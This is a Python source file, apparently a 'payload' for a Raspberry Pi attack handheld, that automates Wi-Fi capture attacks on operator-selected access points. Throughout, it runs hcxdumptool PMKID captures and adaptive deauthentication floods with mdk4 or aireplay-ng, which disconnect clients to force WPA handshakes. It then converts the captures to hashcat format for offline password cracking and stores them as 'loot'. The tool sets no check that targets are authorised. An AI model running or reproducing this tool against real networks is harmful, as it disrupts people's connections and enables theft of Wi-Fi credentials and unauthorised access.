#!/usr/bin/env python3
"""
KTOx payload – WiFi Auto Operator Pro
=========================================
A top‑tier, GUI‑only Wi‑Fi operator for KTOx that automates multi‑target
captures with smart tactics and per‑target reports.

Core features
- Multi-select targets, then queue-run automatically
- PMKID phase (hcxdumptool) per target
- Handshake phase (airodump-ng) with adaptive deauth (broadcast and per-client)
- Optional mdk4 usage when available (for deauth)
- Live airodump CSV parsing for client discovery
- Auto-convert captures to 22000 when hcxtools are present
- Per-session and per-target loot directories + summary.json
- Aggressive Kill toggle and robust cleanup

Requirements
- Root
- Tools: iw, airodump-ng, aireplay-ng; optional: hcxdumptool, hcxpcapngtool, mdk4
- KTOx display + buttons
"""
import os
import sys
import time
import json
import signal
import subprocess
import threading
import shutil
import tempfile
from datetime import datetime

# KTOx pathing
BASE_DIR = os.path.dirname(__file__)
sys.path.append(os.path.abspath(os.path.join(BASE_DIR, '..', '..')))
# Prefer installed KTOx first
if os.path.isdir('/root/KTOx') and '/root/KTOx' not in sys.path:
    sys.path.insert(0, '/root/KTOx')

# Hardware/UI (strict order)
try:
    import RPi.GPIO as GPIO
    import LCD_Config
    import LCD_1in44
    from PIL import Image, ImageDraw, ImageFont
except Exception as e:
    print(f"[ERROR] LCD/GPIO deps missing: {e}", file=sys.stderr)
    sys.exit(1)

# WiFi integration
try:
    from wifi.ktox_integration import get_available_interfaces
    import monitor_mode_helper
    WIFI_OK = True
except Exception:
    WIFI_OK = False

WIDTH, HEIGHT = 128, 128

# PINS from gui_conf.json
PINS = {"UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16}

def _find_gui_conf():
    cands = [
        os.path.join(os.getcwd(), 'gui_conf.json'),
        os.path.join('/root/KTOx', 'gui_conf.json'),
        os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'KTOx', 'gui_conf.json'),
    ]
    for sp in list(sys.path):
        try:
            if sp and os.path.basename(sp) == 'KTOx':
                cands.append(os.path.join(sp, 'gui_conf.json'))
        except Exception:
            pass
    for p in cands:
        if os.path.exists(p): return p
    return None

try:
    cfg = _find_gui_conf()
    if cfg:
        with open(cfg,'r') as f: data = json.load(f)
        mp = data.get('PINS', {})
        PINS = {
            "UP": mp.get("KEY_UP_PIN", PINS["UP"]),
            "DOWN": mp.get("KEY_DOWN_PIN", PINS["DOWN"]),
            "LEFT": mp.get("KEY_LEFT_PIN", PINS["LEFT"]),
            "RIGHT": mp.get("KEY_RIGHT_PIN", PINS["RIGHT"]),
            "OK": mp.get("KEY_PRESS_PIN", PINS["OK"]),
            "KEY1": mp.get("KEY1_PIN", PINS["KEY1"]),
            "KEY2": mp.get("KEY2_PIN", PINS["KEY2"]),
            "KEY3": mp.get("KEY3_PIN", PINS["KEY3"]),
        }
except Exception:
    pass

GPIO.setmode(GPIO.BCM)
for p in PINS.values():
    GPIO.setup(p, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD(); LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
IMG = Image.new("RGB", (WIDTH, HEIGHT), "black")
DRAW = ImageDraw.Draw(IMG)
try:
    FONT_TITLE = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf', 12)
except Exception:
    FONT_TITLE = ImageFont.load_default()
FONT = ImageFont.load_default()

RUN = True

# Config/state
CFG = {
    "aggressive_kill": True,
    "use_mdk4": True,
    "pmkid_secs": 20,
    "hs_secs": 30,
    "deauth_burst": 10,
    "deauth_interval": 0.6,
}

WIFI_IFACE = None
MON_IFACE = None
SESSION_DIR = None

# Loot root (prefer installed KTOx)
KTOX_ROOT = '/root/KTOx' if os.path.isdir('/root/KTOx') else os.path.abspath(os.path.join(BASE_DIR, '..', '..'))
LOOT_ROOT = os.path.join(KTOX_ROOT, 'loot', 'WiFiAutoPro')
os.makedirs(LOOT_ROOT, exist_ok=True)

# ---------- UI helpers ----------

def draw_top(lines):
    IMG.paste((0,0,0), [0,0,WIDTH,HEIGHT])
    y = 3
    for s in lines:
        DRAW.text((4,y), s[:20], font=FONT_TITLE, fill='#00FF00')
        y += 14

def draw_footer(s):
    DRAW.text((4, 112), s[:21], font=FONT, fill='#AAAAAA')
    LCD.LCD_ShowImage(IMG, 0, 0)

def msg(lines, footer=None):
    draw_top(lines)
    if footer:
        draw_footer(footer)
    else:
        LCD.LCD_ShowImage(IMG, 0, 0)

# ---------- Aggressive Kill ----------

def aggressive_kill_setup(iface):
    try:
        subprocess.run(["systemctl","stop","avahi-daemon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["systemctl","stop","NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["systemctl","stop","wpa_supplicant"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["pkill","-9","dhclient"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["pkill","-9","wpa_supplicant"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["rfkill","unblock","all"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["iw","dev", iface, "set", "power_save","off"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

def aggressive_kill_restore():
    try:
        subprocess.run(["systemctl","start","NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["systemctl","start","wpa_supplicant"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["systemctl","start","avahi-daemon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

# ---------- Discovery ----------

def iw_scan_ap_list(base_iface, timeout=8):
    try:
        proc = subprocess.run(["iw","dev", base_iface, "scan"], capture_output=True, text=True, timeout=timeout)
        if proc.returncode != 0:
            return []
        lines = proc.stdout.splitlines()
        aps = []
        bssid=essid=None; ch=None
        for raw in lines:
            s = raw.strip()
            if s.startswith("BSS "):
                if bssid:
                    aps.append((bssid, essid or 'Hidden', ch))
                parts = s.split(); bssid = parts[1] if len(parts) > 1 else None
                essid=None; ch=None
            elif s.startswith("SSID:"):
                essid = s.split(":",1)[1].strip()
            elif s.startswith("primary channel:"):
                try: ch = int(s.split(":",1)[1].strip())
                except: ch=None
        if bssid:
            aps.append((bssid, essid or 'Hidden', ch))
        # Dedup by bssid
        seen=set(); out=[]
        for b,e,c in aps:
            if b and b not in seen:
                seen.add(b); out.append((b,e,c))
        return out
    except Exception:
        return []

# ---------- Helpers ----------

def convert_to_22000(in_path, out_path):
    if shutil.which("hcxpcapngtool") is None:
        return False
    try:
        subprocess.run(["hcxpcapngtool", "-o", out_path, in_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
        return os.path.exists(out_path) and os.path.getsize(out_path) > 0
    except Exception:
        return False

def set_channel(iface, channel):
    try:
        if channel:
            subprocess.run(["iw","dev",iface,"set","channel",str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

# ---------- Attack phases ----------

def pmkid_phase(mon_iface, base_iface, target_dir, bssid, essid, channel, secs):
    out = os.path.join(target_dir, "pmkid.pcapng")
    if CFG.get("aggressive_kill", True): aggressive_kill_setup(base_iface)
    try:
        set_channel(mon_iface, channel)
        proc = subprocess.Popen(["hcxdumptool","-i",mon_iface,"-o",out,"--enable_status=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
        start=time.time(); last=0; db=0.25
        while time.time()-start < secs:
            now=time.time()
            if (GPIO.input(PINS['KEY1'])==0 or GPIO.input(PINS['LEFT'])==0) and now-last>db:
                last=now
                break
            time.sleep(0.2)
    finally:
        try: os.killpg(proc.pid, signal.SIGINT)
        except Exception: pass
        if CFG.get("aggressive_kill", True): aggressive_kill_restore()
    pmkid_22000 = os.path.join(target_dir, "pmkid.22000")
    ok = os.path.exists(out) and os.path.getsize(out) > 64
    if ok:
        convert_to_22000(out, pmkid_22000)
    return ok, (pmkid_22000 if os.path.exists(pmkid_22000) else out if ok else None)


def parse_clients_from_csv(csv_path, target_bssid):
    clients = []
    try:
        with open(csv_path,'r',encoding='utf-8',errors='ignore') as f:
            data=f.read().splitlines()
        station_section=False; saw_blank=False
        for line in data:
            if not line.strip():
                if not saw_blank:
                    saw_blank=True
                    continue
            if saw_blank and line.startswith("Station MAC"):
                station_section=True
                continue
            if station_section:
                parts=[p.strip() for p in line.split(',')]
                if len(parts)>=7:
                    sta=parts[0]; b=parts[5]
                    if b.lower()==(target_bssid or '').lower() and sta not in clients:
                        clients.append(sta)
        return clients
    except Exception:
        return []


def handshake_phase(mon_iface, base_iface, target_dir, bssid, essid, channel, secs):
    prefix = os.path.join(target_dir, "hs")
    csv = f"{prefix}-01.csv"
    if CFG.get("aggressive_kill", True): aggressive_kill_setup(base_iface)
    try:
        dump_cmd=["airodump-ng","-w",prefix]
        if channel: dump_cmd += ["-c", str(channel)]
        if bssid: dump_cmd += ["--bssid", bssid]
        dump_cmd += [mon_iface]
        dump = subprocess.Popen(dump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
        start=time.time(); last=0; db=0.25
        while time.time()-start < secs:
            now=time.time()
            if (GPIO.input(PINS['KEY1'])==0 or GPIO.input(PINS['LEFT'])==0) and now-last>db:
                last=now
                break
            # Adaptive deauth: target clients if any, else broadcast
            clients = parse_clients_from_csv(csv, bssid)
            try:
                if CFG.get('use_mdk4', True) and shutil.which('mdk4'):
                    # Prefer mdk4 deauth when available
                    args=["mdk4", mon_iface, "d", "-B", bssid]
                    for sta in clients[:4]:
                        args += ["-S", sta]
                    if channel: args += ["-c", str(channel)]
                    subprocess.run(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=6)
                else:
                    if clients:
                        for sta in clients[:4]:
                            subprocess.run(["aireplay-ng","-0",str(CFG.get('deauth_burst',10)),"-a",bssid,"-c",sta,mon_iface],
                                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=6)
                    else:
                        subprocess.run(["aireplay-ng","-0",str(CFG.get('deauth_burst',10)),"-a",bssid,mon_iface],
                                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=6)
            except Exception:
                pass
            time.sleep(max(0.2, CFG.get('deauth_interval',0.6)))
    finally:
        try: os.killpg(dump.pid, signal.SIGINT)
        except Exception: pass
        if CFG.get("aggressive_kill", True): aggressive_kill_restore()
    cap = f"{prefix}-01.cap"; h22000 = f"{prefix}-01.22000"
    ok = os.path.exists(cap) and os.path.getsize(cap) > 512
    if ok:
        convert_to_22000(cap, h22000)
    return ok, (h22000 if os.path.exists(h22000) else cap if ok else None)

# ---------- Queue runner ----------

def ensure_session_dir():
    global SESSION_DIR
    if SESSION_DIR is None:
        SESSION_DIR = os.path.join(LOOT_ROOT, datetime.now().strftime('%Y%m%d_%H%M%S'))
        os.makedirs(SESSION_DIR, exist_ok=True)
    return SESSION_DIR


def run_queue(mon_iface, base_iface, targets, channel_map):
    sess = ensure_session_dir()
    summary = []
    last=0; db=0.25
    for idx, (bssid, essid) in enumerate(targets, start=1):
        ch = channel_map.get(bssid)
        tdir = os.path.join(sess, f"{essid or 'Hidden'}_{bssid.replace(':','')}")
        os.makedirs(tdir, exist_ok=True)
        msg([f"[{idx}/{len(targets)}] {essid[:16] if essid else bssid[-8:]}", "PMKID phase..."], "KEY1/LEFT abort")
        ok_pmkid, pmkid_path = pmkid_phase(mon_iface, base_iface, tdir, bssid, essid, ch, CFG.get('pmkid_secs',20))
        if ok_pmkid:
            msg(["PMKID captured", os.path.basename(pmkid_path or '')], "Proceeding")
            time.sleep(0.8)
        msg([f"[{idx}/{len(targets)}] {essid[:16] if essid else bssid[-8:]}", "HS phase..."], "KEY1/LEFT abort")
        ok_hs, hs_path = handshake_phase(mon_iface, base_iface, tdir, bssid, essid, ch, CFG.get('hs_secs',30))
        if ok_hs:
            msg(["Handshake captured", os.path.basename(hs_path or '')], "Saved")
            time.sleep(0.8)
        summary.append({
            "bssid": bssid,
            "essid": essid,
            "channel": ch,
            "pmkid": bool(ok_pmkid),
            "pmkid_path": pmkid_path,
            "handshake": bool(ok_hs),
            "handshake_path": hs_path,
        })
        # allow abort
        now=time.time()
        if (GPIO.input(PINS['KEY1'])==0 or GPIO.input(PINS['LEFT'])==0) and now-last>db:
            last=now
            break
    try:
        with open(os.path.join(sess, 'summary.json'),'w') as f:
            json.dump(summary, f, indent=2)
    except Exception:
        pass
    msg(["Queue done", f"Saved: {len(summary)}"], "Press any key...")

# ---------- Main ----------

def cleanup(*_):
    global RUN
    RUN=False

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

if __name__ == '__main__':
    try:
        if os.geteuid() != 0:
            msg(["Root required"], "Run as sudo"); time.sleep(2); sys.exit(1)
        if not WIFI_OK:
            msg(["WiFi integration missing"], None); time.sleep(2); sys.exit(1)

        # Interface selection (managed)
        ifaces = [i for i in get_available_interfaces() if i.startswith('wlan')]
        if not ifaces:
            msg(["No WiFi iface"], None); time.sleep(2); sys.exit(1)
        sel=0; last=0; db=0.25
        while RUN:
            msg(["Select Interface", ifaces[sel]],["OK=Confirm LEFT=Exit"])
            now=time.time()
            if GPIO.input(PINS['UP'])==0 and now-last>db: last=now; sel=(sel-1)%len(ifaces)
            elif GPIO.input(PINS['DOWN'])==0 and now-last>db: last=now; sel=(sel+1)%len(ifaces)
            elif GPIO.input(PINS['OK'])==0 and now-last>db: last=now; WIFI_IFACE=ifaces[sel]; break
            elif GPIO.input(PINS['LEFT'])==0 and now-last>db: sys.exit(0)
            time.sleep(0.05)

        # Scan APs and multi-select targets
        msg(["Scanning APs..."], None)
        aps = iw_scan_ap_list(WIFI_IFACE, timeout=10)
        if not aps:
            msg(["No APs found"], None); time.sleep(2); sys.exit(1)
        channel_map = {b: c for (b,_,c) in aps}
        selections = set()
        idx=0; last=0
        while RUN:
            b,e,c = aps[idx]
            mark = '*' if b in selections else ' '
            msg(["Pick targets", f"{mark} {e[:16]}", f"ch:{c or '?'} {b[-8:]}"], "OK=Toggle RIGHT=Run LEFT=Back")
            now=time.time()
            if GPIO.input(PINS['UP'])==0 and now-last>db: last=now; idx=(idx-1)%len(aps)
            elif GPIO.input(PINS['DOWN'])==0 and now-last>db: last=now; idx=(idx+1)%len(aps)
            elif GPIO.input(PINS['OK'])==0 and now-last>db:
                last=now
                if b in selections: selections.remove(b)
                else: selections.add(b)
            elif GPIO.input(PINS['RIGHT'])==0 and now-last>db:
                last=now
                break
            elif GPIO.input(PINS['LEFT'])==0 and now-last>db:
                sys.exit(0)
            time.sleep(0.05)
        if not selections:
            # If none selected, default to highlighted
            selections.add(aps[idx][0])
        targets = [(b, next((e for (bb,e,_) in aps if bb==b), None)) for b in selections]

        # Settings quick toggles
        opts = [
            lambda: f"Aggressive Kill: {'ON' if CFG.get('aggressive_kill',True) else 'OFF'}",
            lambda: f"Use mdk4: {'ON' if (CFG.get('use_mdk4',True) and shutil.which('mdk4')) else 'OFF'}",
            lambda: f"PMKID secs: {CFG.get('pmkid_secs',20)}",
            lambda: f"HS secs: {CFG.get('hs_secs',30)}",
            lambda: f"Burst: {CFG.get('deauth_burst',10)} Intv: {CFG.get('deauth_interval',0.6)}",
        ]
        cur=0; last=0
        while RUN:
            msg(["Settings", opts[cur](), "RIGHT=Start"], "UP/DN nav OK edit LEFT back")
            now=time.time()
            if GPIO.input(PINS['UP'])==0 and now-last>db: last=now; cur=(cur-1)%len(opts)
            elif GPIO.input(PINS['DOWN'])==0 and now-last>db: last=now; cur=(cur+1)%len(opts)
            elif GPIO.input(PINS['OK'])==0 and now-last>db:
                last=now
                if cur==0:
                    CFG['aggressive_kill']=not CFG.get('aggressive_kill',True)
                elif cur==1:
                    if shutil.which('mdk4'):
                        CFG['use_mdk4']=not CFG.get('use_mdk4',True)
                elif cur==2:
                    CFG['pmkid_secs']=max(5, min(90, CFG.get('pmkid_secs',20)+5))
                elif cur==3:
                    CFG['hs_secs']=max(10, min(180, CFG.get('hs_secs',30)+10))
                elif cur==4:
                    # Toggle burst then interval
                    if CFG.get('deauth_burst',10) < 30:
                        CFG['deauth_burst']=CFG.get('deauth_burst',10)+5
                    else:
                        CFG['deauth_burst']=10
                    CFG['deauth_interval']=round(0.2 if CFG.get('deauth_interval',0.6) > 0.3 else 0.6,2)
            elif GPIO.input(PINS['RIGHT'])==0 and now-last>db:
                last=now
                break
            elif GPIO.input(PINS['LEFT'])==0 and now-last>db:
                sys.exit(0)
            time.sleep(0.05)

        # Monitor mode
        msg([f"Monitor on {WIFI_IFACE}"], None)
        MON_IFACE = monitor_mode_helper.activate_monitor_mode(WIFI_IFACE)
        if not MON_IFACE:
            msg(["Monitor failed"], None); time.sleep(2); sys.exit(1)
        time.sleep(0.5)

        # Run queue
        run_queue(MON_IFACE, WIFI_IFACE, targets, channel_map)

    except SystemExit:
        pass
    except Exception as e:
        try:
            with open('/tmp/wifi_auto_operator_pro_error.log','w') as f:
                import traceback
                f.write(f"FATAL: {e}\n"); traceback.print_exc(file=f)
        except Exception:
            pass
    finally:
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        try:
            if MON_IFACE:
                monitor_mode_helper.deactivate_monitor_mode(MON_IFACE)
        except Exception:
            pass
        try:
            GPIO.cleanup()
        except Exception:
            pass
